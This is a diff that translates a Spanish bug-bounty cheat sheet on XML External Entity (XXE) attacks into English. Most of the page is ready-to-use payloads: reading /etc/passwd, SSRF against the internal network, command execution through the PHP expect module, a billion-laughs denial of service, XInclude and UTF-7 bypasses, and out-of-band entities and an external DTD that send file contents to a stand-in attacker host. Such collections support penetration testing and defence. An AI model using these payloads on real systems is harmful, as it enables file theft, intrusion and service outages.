@@ -8,54 +8,55 @@ beforetoc: ""
 toc: false
 tags: [ Web, Bug Bounty, Payloads ]
 ---
-Ataques XXE (XML External Entity) son vulnerabilidades que surgen en las aplicaciones que analizan las entradas XML. Gracias a esto un atacante podría alterar los datos XML en la peticion para ejecutar un ataque.
+XXE (XML External Entity) attacks are vulnerabilities that arise in applications that parse XML input. Thanks to this an attacker could alter the XML data in the request to execute an attack.
 
 # Table of Contents
-1. [Peligros en los ataques XXE](#PeligrosXXE)
+1. [Dangers in XXE attacks](#DangersXXE)
 2. [Payloads](#XXEpayloads)<br>
-   2.1. [XXE a LFI](#XXEaLFI)<br>
-   2.2. [XXE a SSRF](#XXEaSSRF)<br>
-   2.3. [XXE a RCE](#XXEaRCE)<br>
-   2.4.  [XXE a DOS](#XXEaDOS)
-6. [Blind en peticion](#BlindXXE)
+   2.1. [XXE to LFI](#XXEtoLFI)<br>
+   2.2. [XXE to SSRF](#XXEtoSSRF)<br>
+   2.3. [XXE to RCE](#XXEtoRCE)<br>
+   2.4.  [XXE to DOS](#XXEtoDOS)
+6. [Blind on request](#BlindXXE)
 7. [Bypass XXE](#XXEBypass)
 8. [Out-Of-Band](#OutOFBand)
 
 ---
 
-### Peligros en los ataques XXE <a name="PeligrosXXE"></a>
-- **Exfiltrar informacion critica:**<br>
-Seria posible obtener archivos internos del servidor, lo cual es peligroso.<br>
-Ejemplo: 
-[XXE a LFI](#XXEaLFI)
-- **Enumerar puertos y dominios en direcciones internas a la red:**<br>
-A través de las peticiones ir enumerando la red<br>
-Ejemplo: 
-[XXE a SSRF](#XXEaSSRF)
-- **Enumerar puertos abiertos en otras direcciones extrernas**<br>
- Hacer una enumeracion de puertos mediante peticiones.
-- **Ejecutar codigo:** <br>
-Si el servidor dispone del modulo "expect" de PHP, seria posible ejecutar codigo y poder llegar a poder ejecutar comandos.<br>
-Ejemplo: 
-[XXE a RCE](#XXEaRCE)
-- **Denegacion del servicio**
-Causa una denegacion de servicio mediante repetidas llamadas en las funciones entitys<br>
-Ejemplo: 
-[XXE a DOS](#XXEaDOS)
+### Dangers in XXE attacks <a name="DangersXXE"></a>
+- **Exfiltrate critical information:**<br>
+It
+would be possible to obtain internal files from the server, which is dangerous.<br>
+Example: 
+[XXE to LFI](#XXEtoLFI)
+- **Enumerate ports and domains in addresses internal to the network:**<br>
+Through the requests enumerate the network.<br>
+Example: 
+[XXE to SSRF](#XXEtoSSRF)
+- **See open ports at other external addresses:**<br>
+ List ports using requests.
+- **Execute code:** <br>
+If the server has the PHP "expect" module, it would be possible to execute code and be able to execute commands.<br>
+Example: 
+[XXE to RCE](#XXEtoRCE)
+- **Denial of service:**
+Causes a denial of service by repeated calls in entitys functions.<br>
+Example: 
+[XXE a DOS](#XXEtoDOS)
 
 ---
 
 ###  XXE payloads <a name="XXEpayloads"></a>
-**LFI Test** <a name="XXEaLFI"></a><br>
-Ver archivos internos del servidor
+**LFI Test** <a name="XXEtoLFI"></a><br>
+View internal server files
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
 <foo>&xxe;</foo>
 ```
 
-**XXE a SSRF** <a name="XXEaSSRF"></a><br>
-Enumerar la red local del servidor
+**XXE a SSRF** <a name="XXEtoSSRF"></a><br>
+List the local network of the server
 ```xml
 <?xml version="1.0"?>
 <!DOCTYPE foo [  
@@ -64,9 +65,8 @@ Enumerar la red local del servidor
 <foo>&xxe;</foo>
 ```
 
-**XXE a RCE** <a name="XXEaRCE"></a><br>
-Abusando del modulo expect de php para ejecutar comandos
-(Se requiere tener este modulo en el servidor)
+**XXE a RCE** <a name="XXEtoRCE"></a><br>
+Abusing the expect module of php to execute commands (It is required to have this module on the server)
 ```xml
 <?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [ <!ELEMENT foo ANY >
@@ -76,8 +76,8 @@ Abusando del modulo expect de php para ejecutar comandos
        <storeId>2</storeId>
     </checkproduct>
 ```
-**XXE a DOS** <a name="XXEaDOS"></a><br>
-Causa una denegacion de servicio mediante repetidas llamadas en las funciones de las entity's
+**XXE a DOS** <a name="XXEtoDOS"></a><br>
+Cause a denial of service by repeatedly calling entity's functions
 ```xml
 <?xml version="1.0"?>
 <!DOCTYPE lolz [
@@ -97,54 +97,55 @@ Causa una denegacion de servicio mediante repetidas llamadas en las funciones de
 ```
 ---
 
-### XXE blind en peticion <a name="BlindXXE"></a>
-**Ver si existe una XXE sin que se vea en la peticion**
+### XXE blind on request <a name="BlindXXE"></a>
+**See if there is an XXE without it being seen in the request**
 
-Una forma de identificar una XML blind en una petición: Si la aplicación incrusta los datos enviados en un documento XML y luego se analiza el documento como pasa en una solicitud SOAP de backend. Podemos probar a inyectar XInclude que es una parte de la especificación XML que permite crear un documento XML a partir de subdocumentos.<br>
-Ejemplo:
+One way to identify an XML blind in a request: If the application embeds the submitted data in an XML document and then parses the document as it passes in a backend SOAP request.
+We can try injecting XInclude which is a part of the XML specification that allows you to create an XML document from subdocuments..<br>
+Example:
 ```xml
 <foo xmlns:xi="http://www.w3.org/2001/XInclude"> <xi:include parse="text" href="file:///etc/passwd"/></foo>
 
 
 
     POST /product/stock HTTP/1.1
-    Host: dominio.com
+    Host: domain.com
     Content-Length: 126
     
     productId=1&storeId=1
     ------------------------------
     POST /product/stock HTTP/1.1
-    Host: dominio.com
+    Host: domain.com
     Content-Length: 126
     
     productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
 ```
 
- **Tambien se podria usar esto en caso de que sea blind**
+ **This could also be used in case it is blind**
  ```xml
 <foo xmlns:xi="http://www.w3.org/2001/XInclude"> <xi:include parse="text" href="file:///etc/passwd"/></foo>
 
     POST /product/stock HTTP/1.1
-    Host: dominio.com
+    Host: domain.com
     Content-Length: 126
     
     productId=1&storeId=1
     ------------------------------
     POST /product/stock HTTP/1.1
-    Host: dominio.com
+    Host: domain.com
     Content-Length: 126
     
-    productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="http://web-atacante.com"/></foo>&storeId=1
+    productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="http://attacker-web.com"/></foo>&storeId=1
 ```
 
-**Blind XXE test (Cuando no devuelve valores)**
+**Blind XXE test (When it does not return values)**
 
 ```xml
 <?xml version="1.0"?>
 <!DOCTYPE foo [
 <!ELEMENT foo (#ANY)>
 <!ENTITY % xxe SYSTEM "file:///etc/passwd">
-<!ENTITY blind SYSTEM "https://subdominio.burpcolaborator.net/?%xxe;">]>
+<!ENTITY blind SYSTEM "https://subdomain.burpcolaborator.net/?%xxe;">]>
 <foo>&blind;</foo>
 ```
 ---
@@ -154,40 +155,40 @@ Ejemplo:
 ```xml
 <?xml version="1.0" encoding="UTF-7"?>
 +ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
-+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://web-atacante.com+ACI +AD4AXQA+
++ADwAIQ-ENTITY xxe SYSTEM +ACI-http://attacker-web.com+ACI +AD4AXQA+
 +ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
 ```
 
-**Access Control bypass (cargando datos confidenciales)**
+**Access Control bypass (loading sensitive data)**
 
 ```xml
 <?xml version="1.0"?>
 <!DOCTYPE foo [
-<!ENTITY cargar SYSTEM "php://filter/read=convert.base64-encode/resource=http://web-vulnerable.com/config.php">]>
+<!ENTITY cargar SYSTEM "php://filter/read=convert.base64-encode/resource=http://vulnerable-web.com/config.php">]>
 <foo><result>&cargar;</result></foo>
 ```
 
 ---
 
-### Ataques XXE Out-Of-Band: <a name="OutOFBand"></a>
+### XXE Out-Of-Band: <a name="OutOFBand"></a>
 
-**EJEMPLO 1**
-- Se inyecta en el valor &xxe; en uno de los valores xml que se envian
+**EXAMPLE 1**
+- It is injected into the value &xxe; in one of the xml values that are sent.
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?> 
-<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://web-atacante.com"> ]>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://attacker-web.com"> ]>
 ```
 
-**EJEMPLO 2**
-- Payload que incluiremos completo en el valor xml que se envia. Hará una peticion a la web del atacante, asi podremos saber si realmente procesa la informacion que le mandamos.
+**EXAMPLE 2**
+- Payload that we will include completely in the xml value that is sent. It will make a request to the attacker's website, so we can know if it really processes the information we send it.
 
 ```xml
-<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-atacante.com"> %xxe; ]>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker-web.com"> %xxe; ]>
 ```
 
-**EJEMPLO 3**
-- Este codigo es de http://web-atacante.com/cositas.dtd
+**EXAMPLE 3**
+- Code from http://web-atacante.com/cositas.dtd
 
 ```xml
 <!ENTITY % file SYSTEM "file:///etc/passwd">
@@ -196,31 +197,31 @@ Ejemplo:
 %exfiltrate; 
 ```
 
-- Inyeccion XML antes de los valores de la pagina, inyectará el codigo de cositas.dtd en la pagina
+- XML injection before the values of the page, it will inject the code of cositas.dtd in the page
 
 ```xml
-<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-atacante.com/cositas.dtd"> %xxe;]>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker-web.com/cositas.dtd"> %xxe;]>
 ```
 
-**EJEMPLO 4**
-- XXE BLIND basado en mensaje de error
-- Este codigo es de http://web-atacante.com/cositas.dtd
+**EXAMPLE 4**
+- XXE BLIND based on error message
+- Code from http://attacker-web.com/cositas.dtd
 
 ```xml
 <!ENTITY % file SYSTEM "file:///etc/passwd">
-<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///estonoexiste/%file;'>">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///notexist/%file;'>">
 %eval;
 %error;
 ```
 
-- Inyeccion XML en la pagina, inyectará el codigo de cositas.dtd 
+- XML injection in the page, it will inject the code of cositas.dtd
 
 ```xml
-<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-atacante.com/cositas.dtd"> %xxe;]>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker-web.com/cositas.dtd"> %xxe;]>
 ```
 
-**EJEMPLO 5**
-- Explotando una XXE abusando de los archivos DTD del sistema, en el archivo llama a ISOamso, usaremos esa variable para explotar la XXE creando un xml personalizado que realice la funcion de llamar al archivo de /etc/passwd que es el objetivo. 
+**EXAMPLE 5**
+- Exploiting an XXE by abusing the system's DTD files, in the file it calls ISOamso, we will use that variable to exploit the XXE by creating a custom xml that performs the function of calling the /etc/passwd file that is the target.
 
 ```xml
 <!DOCTYPE foo [
@@ -228,7 +229,7 @@ Ejemplo:
 <!ENTITY % ISOamso '
   <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
   <!ENTITY &#x25; variable "
-      <!ENTITY &#x26;#x25; errormensaje SYSTEM &#x27;file:///estonoexiste/&#x25;file;&#x27;>
+      <!ENTITY &#x26;#x25; errormensaje SYSTEM &#x27;file:///notexist/&#x25;file;&#x27;>
   ">
   &#x25;variable;
   &#x25;errormensaje;
